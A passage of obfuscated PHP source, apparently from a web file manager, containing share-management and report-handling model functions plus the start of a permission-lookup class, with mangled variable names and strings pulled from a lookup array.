} else { $½·ÊÈœÍ[$â²©êÁş[86]] = Model($â²©êÁş[1318])->pathInfo($½·ÊÈœÍ[$â²©êÁş[411]]); } $½·ÊÈœÍ[$â²©êÁş[1962]] = $¦®›©¥³; return $½·ÊÈœÍ; } protected function getInfoAuth($¬¡‚¤”) { $Ş§²£Ôò =& $_SERVER[ĞÆÏ¡Îª]; $†¿û§ªú = $this->getInfo($¬¡‚¤”); if ($†¿û§ªú[$Ş§²£Ôò[1647]] == USER_ID) { $†¿û§ªú[$Ş§²£Ôò[422]] = $†¿û§ªú[$Ş§²£Ôò[86]][$Ş§²£Ôò[422]]; } else { $†¿û§ªú[$Ş§²£Ôò[422]] = Model($Ş§²£Ôò[511])->authMake($†¿û§ªú[$Ş§²£Ôò[1962]]); } return $†¿û§ªú; } protected function listData($æÜ¢†Õ = null, $„ç®è‡Ÿ = 300) { $ı‘®­®´ =& $_SERVER[ĞÆÏ¡Îª]; $ã‘ğ½ = array(array($ı‘®­®´[503] => array($ı‘®­®´[1003], 0), $ı‘®­®´[505] => array($ı‘®­®´[1003], 0), $ı‘®­®´[1963] => $ı‘®­®´[1917])); if ($æÜ¢†Õ == $ı‘®­®´[1964]) { $ã‘ğ½ = array($ı‘®­®´[503] => 1); } else { if ($æÜ¢†Õ == $ı‘®­®´[1152]) { $ã‘ğ½ = array($ı‘®­®´[505] => 1); } } $ã‘ğ½[$ı‘®­®´[1647]] = USER_ID; $»¾È¿™ = $this->where($ã‘ğ½)->selectPage($„ç®è‡Ÿ); return $»¾È¿™; } protected function listToMe($ÄÈÎ×Üø = 300) { $—ğğçæ¼ =& $_SERVER[ĞÆÏ¡Îª]; $†úÕ¢‡â = Model($—ğğçæ¼[1965])->userGroupParents(USER_ID); $Ò÷µ€øÊ = array($—ğğçæ¼[595] => SourceModel::TYPE_USER, $—ğğçæ¼[514] => USER_ID); if ($†úÕ¢‡â) { $Ò÷µ€øÊ = array(array($—ğğçæ¼[595] => SourceModel::TYPE_USER, $—ğğçæ¼[514] => USER_ID), array($—ğğçæ¼[595] => SourceModel::TYPE_GROUP, $—ğğçæ¼[514] => array($—ğğçæ¼[7], $†úÕ¢‡â)), $—ğğçæ¼[1963] => $—ğğçæ¼[1917]); } $Ä©™œ¼ = Model($—ğğçæ¼[611])->where($Ò÷µ€øÊ)->selectPage($ÄÈÎ×Üø); $—òÁ¸µ = array_to_keyvalue_group($Ä©™œ¼[$—ğğçæ¼[378]], $—ğğçæ¼[498]); if (!$—òÁ¸µ) { return $Ä©™œ¼; } $¯–œÊ¹Å = $—ğğçæ¼[1966]; $Ò÷µ€øÊ = array($—ğğçæ¼[498] => array($—ğğçæ¼[427], array_keys($—òÁ¸µ)), $—ğğçæ¼[1647] => array($—ğğçæ¼[1005], $—ğğçæ¼[197])); $Š˜äÒ´ï = $this->field($¯–œÊ¹Å)->where($Ò÷µ€øÊ)->select(); foreach ($Š˜äÒ´ï as $šµ¥‚ ã => &$Ï–ŞØõ¯) { $Ï–ŞØõ¯[$—ğğçæ¼[1962]] = $—òÁ¸µ[$Ï–ŞØõ¯[$—ğğçæ¼[498]]]; } unset($Ï–ŞØõ¯); $¼·‹Ã©ò = array($—ğğçæ¼[1967] => $Š˜äÒ´ï, $—ğğçæ¼[1968] => $Ä©™œ¼[$—ğğçæ¼[375]]); return $¼·‹Ã©ò; } protected function shareAdd($üŸ¨®ø, $µ‡ÖÁ“) { $şŠ€òçî =& $_SERVER[ĞÆÏ¡Îª]; $¢´€Ãâ³ = $this->_addShareData($üŸ¨®ø, $µ‡ÖÁ“); if (!empty($µ‡ÖÁ“[$şŠ€òçî[1969]])) { $this->_shareAuthSet($¢´€Ãâ³, $µ‡ÖÁ“[$şŠ€òçî[1969]]); } $this->shareEventAdd($üŸ¨®ø, $µ‡ÖÁ“, $şŠ€òçî[1155]); return $¢´€Ãâ³; } protected function shareAddSystem($á÷©£»Ç, $×õ»ñ) { $ÕĞƒÓå• =& $_SERVER[ĞÆÏ¡Îª]; $ª˜ŠÙËŒ = $this->_addShareData($á÷©£»Ç, $×õ»ñ, $ÕĞƒÓå•[1267]); $this->_shareAuthSet($ª˜ŠÙËŒ, $×õ»ñ[$ÕĞƒÓå•[1969]]); return $ª˜ŠÙËŒ; } private function shareEventAdd($Ğ‰±öŠÔ, $æ¨³åÏ, $ùãò£×æ = "\141\144\144") { $ÑÔğİí =& $_SERVER[ĞÆÏ¡Îª]; if (!$Ğ‰±öŠÔ || $Ğ‰±öŠÔ == $ÑÔğİí[197]) { return; } if ($ùãò£×æ == $ÑÔğİí[1155]) { if ($æ¨³åÏ[$ÑÔğİí[503]] == $ÑÔğİí[88]) { Model($ÑÔğİí[579])->eventShare($Ğ‰±öŠÔ, $ÑÔğİí[1970]); } if ($æ¨³åÏ[$ÑÔğİí[505]] == $ÑÔğİí[88]) { Model($ÑÔğİí[579])->eventShare($Ğ‰±öŠÔ, $ÑÔğİí[1971]); } return; } $Îïèä¦Û = $this->getInfoByPath($Ğ‰±öŠÔ); $”œ…‰é¬ = $ÑÔğİí[1972]; if ($Îïèä¦Û[$ÑÔğİí[503]] == $ÑÔğİí[197] && $æ¨³åÏ[$ÑÔğİí[503]] == $ÑÔğİí[88]) { $”œ…‰é¬ = $ÑÔğİí[1970]; } if ($Îïèä¦Û[$ÑÔğİí[503]] == $ÑÔğİí[88] && $æ¨³åÏ[$ÑÔğİí[503]] == $ÑÔğİí[197]) { $”œ…‰é¬ = $ÑÔğİí[1973]; } if ($Îïèä¦Û[$ÑÔğİí[505]] == $ÑÔğİí[197] && $æ¨³åÏ[$ÑÔğİí[505]] == $ÑÔğİí[88]) { $”œ…‰é¬ = $ÑÔğİí[1971]; } if ($Îïèä¦Û[$ÑÔğİí[505]] == $ÑÔğİí[88] && $æ¨³åÏ[$ÑÔğİí[505]] == $ÑÔğİí[197]) { $”œ…‰é¬ = $ÑÔğİí[1974]; } Model($ÑÔğİí[579])->eventShare($Ğ‰±öŠÔ, $”œ…‰é¬); return; } private function _addShareData($Æ±‰ñÜ†, $Òñ¹ïÊ„ = array(), $Úéº¥Ù = false) { $ë–³ªËç =& $_SERVER[ĞÆÏ¡Îª]; $•ö›äğã = $Úéº¥Ù == $ë–³ªËç[1267] ? 0 : USER_ID; $ğğõ•Ô™ = array($ë–³ªËç[426] => $Æ±‰ñÜ†, $ë–³ªËç[1638] => $•ö›äğã); if ($Æ±‰ñÜ† == 0) { $ğğõ•Ô™ = array($ë–³ªËç[1975] => $Òñ¹ïÊ„[$ë–³ªËç[1167]], $ë–³ªËç[1638] => $•ö›äğã); } if ($¹²¯—Èâ = $this->where($ğğõ•Ô™)->find()) { return $¹²¯—Èâ[$ë–³ªËç[498]]; } if ($Æ±‰ñÜ† == 0) { $à®ªíŞ = array($ë–³ªËç[32] => get_path_this($Òñ¹ïÊ„[$ë–³ªËç[84]])); } else { $à®ªíŞ = Model($ë–³ªËç[820])->sourceInfo($Æ±‰ñÜ†); if (!$à®ªíŞ) { return !1; } } if (!$Òñ¹ïÊ„[$ë–³ªËç[1546]]) { $Òñ¹ïÊ„[$ë–³ªËç[1546]] = $à®ªíŞ[$ë–³ªËç[32]]; } $©¾ÆÎ†ã = array($ë–³ªËç[1638] => $•ö›äğã, $ë–³ªËç[426] => $Æ±‰ñÜ†, $ë–³ªËç[1546] => $ë–³ªËç[12], $ë–³ªËç[503] => 0, $ë–³ªËç[505] => 0, $ë–³ªËç[1167] => $ë–³ªËç[12], $ë–³ªËç[316] => $ë–³ªËç[12], $ë–³ªËç[880] => $ë–³ªËç[12], $ë–³ªËç[1976] => 0, $ë–³ªËç[1977] => 0, $ë–³ªËç[506] => 0, $ë–³ªËç[507] => $ë–³ªËç[12], $ë–³ªËç[500] => $ë–³ªËç[12]); $ÈÕÌ¤Ãé = explode($ë–³ªËç[50], $ë–³ªËç[1978]); foreach ($ÈÕÌ¤Ãé as $§¡ˆ™Şğ) { if (!isset($Òñ¹ïÊ„[$§¡ˆ™Şğ])) { continue; } $©¾ÆÎ†ã[$§¡ˆ™Şğ] = $Òñ¹ïÊ„[$§¡ˆ™Şğ]; } $ôê°¸¼Ë = $this->add($©¾ÆÎ†ã); $£³êªºµ = array($ë–³ªËç[500] => short_id($ôê°¸¼Ë)); $this->where(array($ë–³ªËç[497] => $ôê°¸¼Ë))->save($£³êªºµ); return $ôê°¸¼Ë; } private function _shareAuthSet($¼§¿§¯Å, $ëšüƒ©¾) { $ö›åí—İ =& $_SERVER[ĞÆÏ¡Îª]; if (!is_array($ëšüƒ©¾)) { return !1; } $çŠ¤®„ = Model($ö›åí—İ[1927]); $çŠ¤®„->where(array($ö›åí—İ[498] => $¼§¿§¯Å))->delete(); $à›ÀÌÛ€ = array(); foreach ($ëšüƒ©¾ as $ñÅı¼ƒœ) { $Ôô¥®ºİ = SourceModel::TYPE_USER; if ($ñÅı¼ƒœ[$ö›åí—İ[420]] == SourceModel::TYPE_GROUP) { $Ôô¥®ºİ = SourceModel::TYPE_GROUP; } $£ÈÍ£ËÈ = array($ö›åí—İ[498] => $¼§¿§¯Å, $ö›åí—İ[420] => $Ôô¥®ºİ, $ö›åí—İ[514] => intval($ñÅı¼ƒœ[$ö›åí—İ[514]]), $ö›åí—İ[1923] => 0, $ö›åí—İ[1979] => -1); if ($ñÅı¼ƒœ[$ö›åí—İ[1923]]) { $£ÈÍ£ËÈ[$ö›åí—İ[1923]] = $ñÅı¼ƒœ[$ö›åí—İ[1923]]; } else { if ($ñÅı¼ƒœ[$ö›åí—İ[1979]]) { $£ÈÍ£ËÈ[$ö›åí—İ[1979]] = $ñÅı¼ƒœ[$ö›åí—İ[1979]]; } } $à›ÀÌÛ€[] = $£ÈÍ£ËÈ; } return $çŠ¤®„->addAll($à›ÀÌÛ€, array(), !0); } public function numViewAdd($®Ï‘–¿) { $Ä±ËÆ¦ =& $_SERVER[ĞÆÏ¡Îª]; $ÔÌ£°¾  = array($Ä±ËÆ¦[497] => $®Ï‘–¿); $this->where($ÔÌ£°¾ )->setAdd($Ä±ËÆ¦[1976]); } public function numDownloadAdd($ğíÆ—ô·) { $€öÀû…ï =& $_SERVER[ĞÆÏ¡Îª]; $é—üƒ¶Ö = array($€öÀû…ï[497] => $ğíÆ—ô·); $this->where($é—üƒ¶Ö)->setAdd($€öÀû…ï[1977]); } protected function shareEdit($ë ë†ºÂ, $‡ÅÑÉ®¡) { $‹´Û†Ùó =& $_SERVER[ĞÆÏ¡Îª]; $•İŞø®ğ = $this->getInfo($ë ë†ºÂ); if (!$•İŞø®ğ) { return !1; } $this->_checkLinkShare($‡ÅÑÉ®¡, $•İŞø®ğ); $»ÈÂ¸£ = array(); $ğ°ë™´ø = explode($‹´Û†Ùó[50], $‹´Û†Ùó[1980]); foreach ($ğ°ë™´ø as $³µñ¡ß”) { if (!array_key_exists($³µñ¡ß”, $‡ÅÑÉ®¡)) { continue; } $»ÈÂ¸£[$³µñ¡ß”] = $‡ÅÑÉ®¡[$³µñ¡ß”]; } $this->shareEventAdd($•İŞø®ğ[$‹´Û†Ùó[411]], $‡ÅÑÉ®¡, $‹´Û†Ùó[1789]); $this->where(array($‹´Û†Ùó[497] => $ë ë†ºÂ))->save($»ÈÂ¸£); if (isset($‡ÅÑÉ®¡[$‹´Û†Ùó[1969]])) { $this->_shareAuthSet($ë ë†ºÂ, $‡ÅÑÉ®¡[$‹´Û†Ùó[1969]]); } return !0; } private function _checkLinkShare($½ş”¬ÛÔ, $æÍÛ•‘) { $êšªÉ£æ =& $_SERVER[ĞÆÏ¡Îª]; if ($½ş”¬ÛÔ[$êšªÉ£æ[503]] != $êšªÉ£æ[88]) { return; } $÷íƒîÚ¦ = $æÍÛ•‘[$êšªÉ£æ[86]][$êšªÉ£æ[411]]; if ($æÍÛ•‘[$êšªÉ£æ[86]][$êšªÉ£æ[33]] != $êšªÉ£æ[199]) { $áÑÂ­ÉÕ = $this->_folderReport($÷íƒîÚ¦); if (!$áÑÂ­ÉÕ) { return; } show_json(LNG($êšªÉ£æ[1981]) . $êšªÉ£æ[1982] . $áÑÂ­ÉÕ, !1); } $±Ä§¾ƒ = Model($êšªÉ£æ[820])->fileInfoGet($æÍÛ•‘[$êšªÉ£æ[86]][$êšªÉ£æ[411]]); if (!$±Ä§¾ƒ) { return; } $ÖÕÚ‰•÷ = $this->shareFileMeta($±Ä§¾ƒ[$êšªÉ£æ[477]]); if (isset($ÖÕÚ‰•÷[$êšªÉ£æ[383]]) && $ÖÕÚ‰•÷[$êšªÉ£æ[383]] == $êšªÉ£æ[88]) { show_json(LNG($êšªÉ£æ[1983]), !1); } } private function _folderReport($·“¬áŸ³) { $íØ¡ƒª =& $_SERVER[ĞÆÏ¡Îª]; $¡ıìû = array($íØ¡ƒª[477] => array($íØ¡ƒª[1003], 0), $íØ¡ƒª[745] => 3); $Â‡’Õ™¸ = Model($íØ¡ƒª[1984])->where($¡ıìû)->field($íØ¡ƒª[477])->select(); if (!$Â‡’Õ™¸) { return !1; } $Â‡’Õ™¸ = array_to_keyvalue($Â‡’Õ™¸, $íØ¡ƒª[12], $íØ¡ƒª[477]); $“Ë¼¨ñÕ = $íØ¡ƒª[50] . $·“¬áŸ³ . $íØ¡ƒª[50]; $¡ıìû = array($íØ¡ƒª[477] => array($íØ¡ƒª[7], $Â‡’Õ™¸), $íØ¡ƒª[530] => array($íØ¡ƒª[391], "\45{$“Ë¼¨ñÕ}\x25"), $íØ¡ƒª[440] => 0); $è©Ã–±Ï = Model($íØ¡ƒª[820])->where($¡ıìû)->field($íØ¡ƒª[1985])->find(); if (!$è©Ã–±Ï) { return !1; } $ÔÇÚ‹Ñ¼ = substr($è©Ã–±Ï[$íØ¡ƒª[530]], strpos($è©Ã–±Ï[$íØ¡ƒª[530]], $“Ë¼¨ñÕ)); $¡ıìû = array($íØ¡ƒª[411] => array($íØ¡ƒª[7], trim($ÔÇÚ‹Ñ¼, $íØ¡ƒª[50]))); $¿©Á…·€ = Model($íØ¡ƒª[820])->where($¡ıìû)->field($íØ¡ƒª[32])->select(); $²Å · = array_to_keyvalue($¿©Á…·€, $íØ¡ƒª[12], $íØ¡ƒª[32]); $²Å ·[] = $è©Ã–±Ï[$íØ¡ƒª[32]]; return implode($íØ¡ƒª[8], $²Å ·); } protected function remove($ÁˆÂğĞÏ) { $Êå¶éå£ =& $_SERVER[ĞÆÏ¡Îª]; if (is_array($ÁˆÂğĞÏ)) { $ÁˆÂğĞÏ = array($Êå¶éå£[7], $ÁˆÂğĞÏ); } $¶¾œ¶¹Ä = array($Êå¶éå£[498] => $ÁˆÂğĞÏ); $åù®†‹‚ = $this->where($¶¾œ¶¹Ä)->delete(); if ($åù®†‹‚) { Model($Êå¶éå£[611])->where(array($Êå¶éå£[498] => $ÁˆÂğĞÏ))->delete(); } $·æ’Æ‰æ = is_array($ÁˆÂğĞÏ) ? $ÁˆÂğĞÏ[1] : array($ÁˆÂğĞÏ); for ($›ÒŸˆŒ˜ = 0; $›ÒŸˆŒ˜ < count($·æ’Æ‰æ); $›ÒŸˆŒ˜++) { $ÅõˆÏ£ö = $this->getInfo($·æ’Æ‰æ[$›ÒŸˆŒ˜]); if ($ÅõˆÏ£ö[$Êå¶éå£[505]] == $Êå¶éå£[88]) { Model($Êå¶éå£[579])->eventShare($ÅõˆÏ£ö[$Êå¶éå£[411]], $Êå¶éå£[1974]); } if ($ÅõˆÏ£ö[$Êå¶éå£[503]] == $Êå¶éå£[88]) { Model($Êå¶éå£[579])->eventShare($ÅõˆÏ£ö[$Êå¶éå£[411]], $Êå¶éå£[1973]); } } return $åù®†‹‚; } protected function removeBySource($ÏËÄµ›) { $ÈÑ£¿µ =& $_SERVER[ĞÆÏ¡Îª]; $â“ËæÈ¨ = array($ÈÑ£¿µ[426] => array($ÈÑ£¿µ[427], $ÏËÄµ›)); $´ˆ£ø“š = $this->field($ÈÑ£¿µ[498])->where($â“ËæÈ¨)->select(); $´ˆ£ø“š = array_to_keyvalue($´ˆ£ø“š, $ÈÑ£¿µ[12], $ÈÑ£¿µ[498]); if (!$´ˆ£ø“š) { return; } $â“ËæÈ¨ = array($ÈÑ£¿µ[497] => array($ÈÑ£¿µ[427], $´ˆ£ø“š)); $this->where($â“ËæÈ¨)->delete(); Model($ÈÑ£¿µ[611])->where($â“ËæÈ¨)->delete(); } public function listAll($Œìáç’ì) { $óË³àÆ˜ =& $_SERVER[ĞÆÏ¡Îª]; $êõäˆ = array(); if ($Œìáç’ì[$óË³àÆ˜[1647]]) { $êõäˆ[$óË³àÆ˜[1647]] = $Œìáç’ì[$óË³àÆ˜[1647]]; } if ($Œìáç’ì[$óË³àÆ˜[756]]) { $İÌĞøıŞ = $Œìáç’ì[$óË³àÆ˜[506]] ? $Œìáç’ì[$óË³àÆ˜[506]] : strtotime(date($óË³àÆ˜[1986])); $êõäˆ[$óË³àÆ˜[200]] = array($óË³àÆ˜[342], array($Œìáç’ì[$óË³àÆ˜[756]], $İÌĞøıŞ)); } if ($Œìáç’ì[$óË³àÆ˜[33]]) { $êõäˆ[$Œìáç’ì[$óË³àÆ˜[33]]] = 1; } else { $êõäˆ[] = array($óË³àÆ˜[503] => array($óË³àÆ˜[1003], 0), $óË³àÆ˜[505] => array($óË³àÆ˜[1003], 0), $óË³àÆ˜[1963] => $óË³àÆ˜[1917]); } if ($Œìáç’ì[$óË³àÆ˜[1913]]) { $êõäˆ[] = array($óË³àÆ˜[500] => $Œìáç’ì[$óË³àÆ˜[1913]], $óË³àÆ˜[1546] => array($óË³àÆ˜[391], "\45{$Œìáç’ì[$óË³àÆ˜[1913]]}\x25"), $óË³àÆ˜[1963] => $óË³àÆ˜[1917]); } $µµ”ÏÀĞ = $this->_makeOrder()->where($êõäˆ)->selectPage(20); if (empty($µµ”ÏÀĞ[$óË³àÆ˜[378]])) { return array(); } $this->_listDataApply($µµ”ÏÀĞ[$óË³àÆ˜[378]]); return $µµ”ÏÀĞ; } public function listDataApply($Ğèûóö) { $this->_listDataApply($Ğèûóö); return $Ğèûóö; } private function _listDataApply(&$æÁÂÙí) { $ÊùÍÆßš =& $_SERVER[ĞÆÏ¡Îª]; $²ÃÔÌ±Ä = array_to_keyvalue($æÁÂÙí, $ÊùÍÆßš[12], $ÊùÍÆßš[1647]); $¢Š¡©Î± = Model($ÊùÍÆßš[544])->userListInfo(array_unique($²ÃÔÌ±Ä)); $Õó—×Á = array_to_keyvalue($æÁÂÙí, $ÊùÍÆßš[12], $ÊùÍÆßš[411]); $Ä—¡ŸÆ = Model($ÊùÍÆßš[820])->sourceListInfo($Õó—×Á, !0); foreach ($æÁÂÙí as $òëÉï => &$¼©µÚå) { $çÖßè”ö = $¼©µÚå[$ÊùÍÆßš[1647]]; $¼©µÚå[$ÊùÍÆßš[1987]] = $¢Š¡©Î±[$çÖßè”ö] ? $¢Š¡©Î±[$çÖßè”ö] : !1; $¦¤èÌ»ß = $¼©µÚå[$ÊùÍÆßš[411]]; $¼©µÚå[$ÊùÍÆßš[86]] = $Ä—¡ŸÆ[$¦¤èÌ»ß] ? $Ä—¡ŸÆ[$¦¤èÌ»ß] : !1; if ($¼©µÚå[$ÊùÍÆßš[86]][$ÊùÍÆßš[440]] == $ÊùÍÆßš[88]) { unset($æÁÂÙí[$òëÉï]); } if ($¼©µÚå[$ÊùÍÆßš[86]] != $ÊùÍÆßš[197] && !$¼©µÚå[$ÊùÍÆßš[86]]) { unset($æÁÂÙí[$òëÉï]); } } unset($¼©µÚå); $æÁÂÙí = array_values($æÁÂÙí); } private function _makeOrder($õ¢Æïãû = '') { $³Ó‰ãØ¸ =& $_SERVER[ĞÆÏ¡Îª]; $Ğ„ÖÔÔî = array($³Ó‰ãØ¸[200], $³Ó‰ãØ¸[506], $³Ó‰ãØ¸[1976], $³Ó‰ãØ¸[1977]); $šæšš«’ = array($³Ó‰ãØ¸[459] => $³Ó‰ãØ¸[460], $³Ó‰ãØ¸[461] => $³Ó‰ãØ¸[462]); $¾òÜÊ¨ï = Input::get($³Ó‰ãØ¸[466], $³Ó‰ãØ¸[7], $³Ó‰ãØ¸[432], $Ğ„ÖÔÔî); $üïùƒİ = Input::get($³Ó‰ãØ¸[467], $³Ó‰ãØ¸[7], $³Ó‰ãØ¸[1988], array($³Ó‰ãØ¸[1910], $³Ó‰ãØ¸[461])); $üïùƒİ = $šæšš«’[$üïùƒİ]; $õ¢Æïãû = $õ¢Æïãû . "{$¾òÜÊ¨ï}\40{$üïùƒİ}"; return $this->order($õ¢Æïãû); } public function reportAdd($µºÂ›âŞ) { $§Ş’½¯´ =& $_SERVER[ĞÆÏ¡Îª]; $‰Ÿ³ºÙí = array($§Ş’½¯´[498] => $µºÂ›âŞ[$§Ş’½¯´[498]], $§Ş’½¯´[1647] => USER_ID); if (Model($§Ş’½¯´[1984])->where($‰Ÿ³ºÙí)->find()) { return !1; } $”Áçßİß = array($§Ş’½¯´[498] => $µºÂ›âŞ[$§Ş’½¯´[498]], $§Ş’½¯´[1546] => $µºÂ›âŞ[$§Ş’½¯´[1546]], $§Ş’½¯´[411] => $µºÂ›âŞ[$§Ş’½¯´[411]], $§Ş’½¯´[477] => $µºÂ›âŞ[$§Ş’½¯´[477]], $§Ş’½¯´[1647] => USER_ID, $§Ş’½¯´[33] => $µºÂ›âŞ[$§Ş’½¯´[33]], $§Ş’½¯´[462] => $µºÂ›âŞ[$§Ş’½¯´[462]]); return Model($§Ş’½¯´[1984])->add($”Áçßİß); } public function reportList($Šµ„Ì¹Š) { $À‰÷Ûàù =& $_SERVER[ĞÆÏ¡Îª]; $Ó¿ª¯‰† = array(); if ($Šµ„Ì¹Š[$À‰÷Ûàù[756]]) { $ƒ«ÌÏá¯ = $Šµ„Ì¹Š[$À‰÷Ûàù[506]] ? $Šµ„Ì¹Š[$À‰÷Ûàù[506]] : strtotime(date($À‰÷Ûàù[1986])); $Ó¿ª¯‰†[$À‰÷Ûàù[200]] = array($À‰÷Ûàù[342], array($Šµ„Ì¹Š[$À‰÷Ûàù[756]], $ƒ«ÌÏá¯)); } if (isset($Šµ„Ì¹Š[$À‰÷Ûàù[33]]) && in_array($Šµ„Ì¹Š[$À‰÷Ûàù[33]], array($À‰÷Ûàù[88], $À‰÷Ûàù[446], $À‰÷Ûàù[1989], $À‰÷Ûàù[1990], $À‰÷Ûàù[1991]))) { $Ó¿ª¯‰†[$À‰÷Ûàù[33]] = $Šµ„Ì¹Š[$À‰÷Ûàù[33]]; } if (isset($Šµ„Ì¹Š[$À‰÷Ûàù[745]]) && in_array($Šµ„Ì¹Š[$À‰÷Ûàù[745]], array($À‰÷Ûàù[197], $À‰÷Ûàù[88], $À‰÷Ûàù[446], $À‰÷Ûàù[1989]))) { $Ó¿ª¯‰†[$À‰÷Ûàù[745]] = $Šµ„Ì¹Š[$À‰÷Ûàù[745]]; } $İ¤çÑ¦Ğ = Input::get($À‰÷Ûàù[467], $À‰÷Ûàù[7], $À‰÷Ûàù[1988], array($À‰÷Ûàù[1910], $À‰÷Ûàù[461])); $…µ¡ûÛ¡ = array($À‰÷Ûàù[459] => $À‰÷Ûàù[460], $À‰÷Ûàù[461] => $À‰÷Ûàù[462]); $ÉÊ÷Íª® = $À‰÷Ûàù[1992] . $…µ¡ûÛ¡[$İ¤çÑ¦Ğ]; $ù‚»úÔ¦ = Model($À‰÷Ûàù[1984])->where($Ó¿ª¯‰†)->order($ÉÊ÷Íª®)->selectPage(20); if (empty($ù‚»úÔ¦[$À‰÷Ûàù[378]])) { return array(); } $Ë€ü‘Áß = array_to_keyvalue_group($ù‚»úÔ¦[$À‰÷Ûàù[378]], $À‰÷Ûàù[745], $À‰÷Ûàù[498]); if (!empty($Ë€ü‘Áß[0])) { $Šµ„Ì¹Š = $Ë€ü‘Áß[0]; $Ó¿ª¯‰† = array($À‰÷Ûàù[498] => array($À‰÷Ûàù[7], $Šµ„Ì¹Š)); $®¬¢ğ£˜ = $this->where($Ó¿ª¯‰†)->field($À‰÷Ûàù[498])->select(); $®¬¢ğ£˜ = array_to_keyvalue($®¬¢ğ£˜, $À‰÷Ûàù[12], $À‰÷Ûàù[498]); $ª„ÆØÒƒ = array_diff($Šµ„Ì¹Š, $®¬¢ğ£˜); if (!empty($ª„ÆØÒƒ)) { foreach ($ù‚»úÔ¦[$À‰÷Ûàù[378]] as $‘¦È¯›ë => $ŞÌ³üìÄ) { if (in_array($ŞÌ³üìÄ[$À‰÷Ûàù[498]], $ª„ÆØÒƒ)) { unset($ù‚»úÔ¦[$À‰÷Ûàù[378]][$‘¦È¯›ë]); } } } } $this->_listDataApply($ù‚»úÔ¦[$À‰÷Ûàù[378]]); return $ù‚»úÔ¦; } public function reportStatus($•†æ Ô•) { $ø®íÇ³ =& $_SERVER[ĞÆÏ¡Îª]; $À§âÖ³¹ = array($ø®íÇ³[407] => $•†æ Ô•[$ø®íÇ³[407]]); $‰Ûåƒ¿‘ = Model($ø®íÇ³[1984])->where($À§âÖ³¹)->field($ø®íÇ³[1993])->find(); if (!$‰Ûåƒ¿‘) { return !1; } $‚ÔéÛ¦‚ = array($ø®íÇ³[745] => $•†æ Ô•[$ø®íÇ³[745]]); if ($•†æ Ô•[$ø®íÇ³[745]] == $ø®íÇ³[1989] && $‰Ûåƒ¿‘[$ø®íÇ³[745]] == $ø®íÇ³[1989]) { $‚ÔéÛ¦‚[$ø®íÇ³[745]] = 0; } $ê›‡‡ÄÛ = Model($ø®íÇ³[1984])->where($À§âÖ³¹)->save($‚ÔéÛ¦‚); if ($•†æ Ô•[$ø®íÇ³[745]] == $ø®íÇ³[446]) { if ($‰Ûåƒ¿‘[$ø®íÇ³[477]] != $ø®íÇ³[197] && $this->shareFileMeta($‰Ûåƒ¿‘[$ø®íÇ³[477]])) { $this->shareFileMeta($‰Ûåƒ¿‘[$ø®íÇ³[477]], 0); } $this->remove($‰Ûåƒ¿‘[$ø®íÇ³[498]]); return !0; } if ($ê›‡‡ÄÛ && $•†æ Ô•[$ø®íÇ³[745]] == $ø®íÇ³[1989]) { $üÄ‘áí = $‚ÔéÛ¦‚[$ø®íÇ³[745]] == $ø®íÇ³[1989] ? 1 : 0; $this->shareFileMeta($‰Ûåƒ¿‘[$ø®íÇ³[477]], $üÄ‘áí); $this->removeByFile($‰Ûåƒ¿‘[$ø®íÇ³[477]]); } return $ê›‡‡ÄÛ; } private function removeByFile($öƒ°Æ®Ë) { $Ş¤¯ÜÅü =& $_SERVER[ĞÆÏ¡Îª]; $ô·µıÆÁ = Model($Ş¤¯ÜÅü[820])->where(array($Ş¤¯ÜÅü[477] => $öƒ°Æ®Ë))->field($Ş¤¯ÜÅü[411])->select(); $²›ê’›˜ = array_to_keyvalue($ô·µıÆÁ, $Ş¤¯ÜÅü[12], $Ş¤¯ÜÅü[411]); $ôù­ÌÚµ = array($Ş¤¯ÜÅü[411] => array($Ş¤¯ÜÅü[7], $²›ê’›˜), $Ş¤¯ÜÅü[503] => 1); $ô·µıÆÁ = $this->where($ôù­ÌÚµ)->field($Ş¤¯ÜÅü[498])->select(); if (empty($ô·µıÆÁ)) { return; } $Ó­„°°Ñ = array_to_keyvalue($ô·µıÆÁ, $Ş¤¯ÜÅü[12], $Ş¤¯ÜÅü[498]); $this->remove($Ó­„°°Ñ); } private function shareFileMeta($Œ¸Á’âË, $ò©œ³ = null) { $Ñ‚¾‰£¼ =& $_SERVER[ĞÆÏ¡Îª]; $²íİü¨è = array($Ñ‚¾‰£¼[477] => $Œ¸Á’âË, $Ñ‚¾‰£¼[94] => $Ñ‚¾‰£¼[1994]); if (is_null($ò©œ³)) { return Model($Ñ‚¾‰£¼[1995])->where($²íİü¨è)->find(); } $²íİü¨è[$Ñ‚¾‰£¼[383]] = $ò©œ³; Model($Ñ‚¾‰£¼[1995])->add($²íİü¨è, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\162\x63\145\137\x61\165\164\x68"; public function getAuth($ø´íà“Ë) { $¶Š¨¸Âã =& $_SERVER[ĞÆÏ¡Îª]; $‰Åå¼ƒî = $this->sourceAuthSelect($ø´íà“Ë); $óËËÂ˜ = array(); $ˆ÷™«Èå = array(); $û€šÅ€Â = 2 << 25; foreach ($‰Åå¼ƒî as $Œ¹‡ŒÊĞ) { $È†ÃœúŒ = Model($¶Š¨¸Âã[516])->listData($Œ¹‡ŒÊĞ[$¶Š¨¸Âã[1923]]); if (!$È†ÃœúŒ) { continue; } $óËËÂ˜[] = $Œ¹‡ŒÊĞ; $ü™ÔÒ‘ = 0; if ($Œ¹‡ŒÊĞ[$¶Š¨¸Âã[420]] == SourceModel::TYPE_GROUP) { $ü™ÔÒ‘ = $û€šÅ€Â * 2; } if ($Œ¹‡ŒÊĞ[$¶Š¨¸Âã[420]] == SourceModel::TYPE_USER) { $ü™ÔÒ‘ = $û€šÅ€Â; } if ($Œ¹‡ŒÊĞ[$¶Š¨¸Âã[420]] == SourceModel::TYPE_USER && $Œ¹‡ŒÊĞ[$¶Š¨¸Âã[514]] == $¶Š¨¸Âã[197]) { $ü™ÔÒ‘ = 0; } $ˆ÷™«Èå[] = $È†ÃœúŒ[$¶Š¨¸Âã[422]] + $ü™ÔÒ‘; } array_multisort($ˆ÷™«Èå, SORT_DESC, $óËËÂ˜); return $óËËÂ˜; } public function sourceAuthSelect($‘ò†‹¹ˆ) { $Á¦êÖ¨Ç =& $_SERVER[ĞÆÏ¡Îª]; static $½ûóÍÑ = array(); $ş°á©ùË = is_array($‘ò†‹¹ˆ) ? !1 : !0; if ($ş°á©ùË) { $‘ò†‹¹ˆ = array($‘ò†‹¹ˆ); } $ çÍ¹ùĞ = array(); foreach ($‘ò†‹¹ˆ as $ƒ…¬ÂÁå) { if 